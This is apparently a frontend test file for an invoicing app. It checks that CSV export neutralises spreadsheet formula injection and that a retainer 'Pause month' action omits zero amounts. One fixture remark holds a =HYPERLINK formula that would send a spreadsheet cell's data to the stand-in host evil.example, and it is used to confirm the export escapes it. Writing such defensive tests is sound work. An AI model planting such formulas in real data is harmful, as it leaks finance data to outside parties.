/**
 * Two invoice-page actions, driven through the real pages.
 *
 * CSV export: a remark is free text that editors and public edit links can
 * write, and the export copied it verbatim — so =HYPERLINK(...) became a live
 * formula in finance's spreadsheet.
 *
 * Pause month: the retainer "Pause month" button posted amount_raised=0 and
 * amount_with_tax=0. The API refuses a non-positive invoice amount, so every
 * pause failed with a 422 (shown as "[object Object]") and the month stayed
 * "Missing". A pause carries no amount, and the fields are optional.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { render, screen, fireEvent, waitFor, act } from '@testing-library/react'
import { MemoryRouter } from 'react-router-dom'

const { api, retainerRecord, toastFn } = vi.hoisted(() => {
  // Last month's retainer invoice: the template, with this month "Missing".
  const d = new Date()
  const lastMonth = new Date(d.getFullYear(), d.getMonth() - 1, 15)
  const raised = `${lastMonth.getFullYear()}-${String(lastMonth.getMonth() + 1).padStart(2, '0')}-01`
  const retainerRecord = {
    id: 'recRet1',
    fields: {
      'Invoice Number': 'RET-001', 'Project': 'Acme Retainer', 'Client Name': 'Acme',
      'Category': 'Development- Retainer', 'Payment Status': 'Paid', 'Currency': 'RS',
      'Raised Date': raised, 'Cleared Date': raised, 'Raised By': 'am@example.com',
      'Amount Raised': 50000, 'Amount with Tax': 59000, 'Amount Received': 59000,
      'Outstanding Amount': -250,
      'Remark': '=HYPERLINK("https://evil.example/?d="&B2,"Open invoice")',
    },
  }

  const anything = () => {
    const own = new Map()
    return new Proxy(function () {}, {
      get(target, key) {
        if (typeof key === 'symbol') return undefined
        if (key === 'then') return undefined
        if (!own.has(key)) own.set(key, anything())
        return own.get(key)
      },
      apply: () => Promise.resolve({ records: [] }),
    })
  }
  const ns = (obj) => {
    const spare = new Map()
    return new Proxy(obj, {
      get(t, k) {
        if (k in t) return t[k]
        if (typeof k === 'symbol') return undefined
        if (!spare.has(k)) spare.set(k, anything())
        return spare.get(k)
      },
    })
  }
  const ok = (v) => vi.fn().mockResolvedValue(v)
  const summary = { total_raised: 50000, total_received: 59000, total_outstanding: 0, collection_rate: 100, by_status: { Paid: 1 } }
  const api = ns({
    invoices: ns({
      list: ok({ records: [retainerRecord] }),
      summary: ok(summary),
      agingBuckets: ok({ buckets: [] }),
      picklists: ok({}),
      create: ok({ id: 'recPaused' }),
    }),
    webInvoices: ns({
      list: ok({ records: [retainerRecord], total: 1 }),
      summary: ok(summary),
      agingBuckets: ok({ buckets: [] }),
      avatarMap: ok({}),
      picklists: ns({ get: ok({}) }),
      create: ok({ id: 'recWebPaused' }),
    }),
  })
  const toastFn = Object.assign(vi.fn(), { showToast: vi.fn() })
  return { api, retainerRecord, toastFn }
})

vi.mock('../services/api', () => ({
  api, API_BASE_URL: '', getAuthToken: () => '', setAuthToken: vi.fn(), clientCacheBust: vi.fn(),
}))
vi.mock('../context/AuthContext', () => ({
  useAuth: () => ({
    status: 'authed', role: 'all', authRole: 'superadmin', isAdmin: true, isViewer: false,
    isWeb: false, isAll: true, isEditor: true, isImpersonating: false, isEmailAuth: false,
    user: { email: 'a@b.c' }, userEmail: 'a@b.c',
    hasPerm: () => true,
  }),
  AuthProvider: ({ children }) => children,
}))
vi.mock('../context/ThemeContext', () => ({
  useTheme: () => ({ dark: false, toggle: vi.fn() }),
  ThemeProvider: ({ children }) => children,
}))
vi.mock('../context/ToastContext', () => ({
  useToast: () => toastFn,
  ToastProvider: ({ children }) => children,
}))
vi.mock('../hooks/usePageMeta', () => ({ usePageMeta: vi.fn() }))
vi.mock('../context/ConfirmContext', () => ({
  useConfirm: () => vi.fn().mockResolvedValue(true),
  ConfirmProvider: ({ children }) => children,
}))

import Invoices from '../pages/Invoices'
import WebInvoices from '../pages/WebInvoices'

beforeEach(() => {
  vi.clearAllMocks()
  vi.stubGlobal('IntersectionObserver', class {
    constructor(cb) { this.cb = cb }
    observe(el) { this.cb([{ isIntersecting: true, target: el }]) }
    unobserve() {} disconnect() {}
  })
  vi.stubGlobal('ResizeObserver', class { observe() {} unobserve() {} disconnect() {} })
  window.matchMedia = window.matchMedia || (q => ({
    matches: false, media: q, onchange: null,
    addListener: vi.fn(), removeListener: vi.fn(),
    addEventListener: vi.fn(), removeEventListener: vi.fn(), dispatchEvent: vi.fn(),
  }))
  vi.stubGlobal('prompt', vi.fn(() => 'client on leave'))
})
afterEach(() => vi.unstubAllGlobals())

describe('Invoices CSV export', () => {
  it('neutralises formula text and keeps negative amounts numeric', async () => {
    let blob = null
    URL.createObjectURL = vi.fn((b) => { blob = b; return 'blob:csv' })
    URL.revokeObjectURL = vi.fn()
    render(<MemoryRouter><Invoices /></MemoryRouter>)
    fireEvent.click(await screen.findByTitle('Download invoices as CSV'))
    fireEvent.click(await screen.findByRole('button', { name: /All records \(1\)/ }))

    expect(blob).not.toBeNull()
    const text = await blob.text()
    const [header, row] = text.split('\n')
    expect(header.split(',')).toContain('Remark')
    expect(row).toContain(`"'=HYPERLINK(""https://evil.example/?d=""&B2,""Open invoice"")"`)
    expect(row).not.toMatch(/(^|,)"?=HYPERLINK/)
    expect(row.split(',')).toContain('-250')
  })
})

describe('Retainer "Pause month"', () => {
  it.each([
    ['Invoices', Invoices, '/', () => api.invoices.create],
    ['WebInvoices', WebInvoices, '/?tab=retainers', () => api.webInvoices.create],
  ])('%s records a Cancelled month without zero amounts', async (name, Page, url, create) => {
    render(<MemoryRouter initialEntries={[url]}><Page /></MemoryRouter>)
    if (name === 'Invoices') {
      await screen.findAllByText('RET-001')
      fireEvent.click(screen.getAllByRole('button', { name: 'Retainers' })[0])
    }
    const pause = (await screen.findAllByRole('button', { name: 'Pause month' }))[0]
    await act(async () => { fireEvent.click(pause) })

    await waitFor(() => expect(create()).toHaveBeenCalledTimes(1))
    const payload = create().mock.calls[0][0]
    expect(payload).toMatchObject({ project: 'Acme Retainer', payment_status: 'Cancelled' })
    expect(payload.remark).toContain('client on leave')
    // The API refuses 0 (and any non-positive amount); a pause has none.
    expect(payload.amount_raised).toBeUndefined()
    expect(payload.amount_with_tax).toBeUndefined()
    expect(JSON.parse(JSON.stringify(payload))).not.toHaveProperty('amount_raised')
    expect(retainerRecord.fields['Amount Raised']).toBe(50000)   // template untouched
  })
})
